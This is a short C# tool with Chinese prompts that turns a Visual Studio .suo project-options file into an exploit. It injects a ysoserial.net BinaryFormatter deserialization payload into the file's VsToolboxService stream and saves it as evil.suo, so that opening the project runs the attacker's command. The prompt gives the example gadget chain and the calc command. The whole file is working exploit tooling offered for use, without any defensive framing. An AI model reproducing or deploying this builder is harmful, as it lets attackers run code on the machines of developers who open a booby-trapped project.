using System.Text.RegularExpressions;
using OpenMcdf;

bool IsBase64String(string s){
    s = s.Trim();
    return (s.Length % 4 == 0) && Regex.IsMatch(s, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
}

Console.Write("输入suo文件路径\n>");
string suo = Console.ReadLine();
if (!File.Exists(suo))
{
    Console.WriteLine("文件不存在");
    Environment.Exit(1);
}

Console.Write("\n\n输入payload\nysoserial.net示例： ysoserial -g ClaimsIdentity -f BinaryFormatter -c calc -o base64 -bgc TypeConfuseDelegate\n>");
string payload = Console.ReadLine();
if (!IsBase64String(payload)) {
    Console.WriteLine("\n\n请输入正确的payload");
    Environment.Exit(1);
}

byte[] CombineArrays(byte[] first, byte[] second)
{
    byte[] result = new byte[first.Length + second.Length];
    Buffer.BlockCopy(first, 0, result, 0, first.Length);
    Buffer.BlockCopy(second, 0, result, first.Length, second.Length);
    return result;
}
byte[] payload_header = { 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 };

CompoundFile cf = new CompoundFile(suo);
try {
    cf.RootStorage.GetStream("VsToolboxService").SetData(CombineArrays(payload_header, Convert.FromBase64String(payload)));
    string o = Environment.CurrentDirectory + "\\evil.suo";
    cf.Save(o);
    cf.Close();
    Console.WriteLine("\n\n成功，文件已保存到 " + o);
}
catch (CFItemNotFound) {
    Console.WriteLine("\n\n错误：该项目不可使用反序列化漏洞");
}
catch (Exception e) {
    Console.WriteLine("\n\n错误：" + e);
}
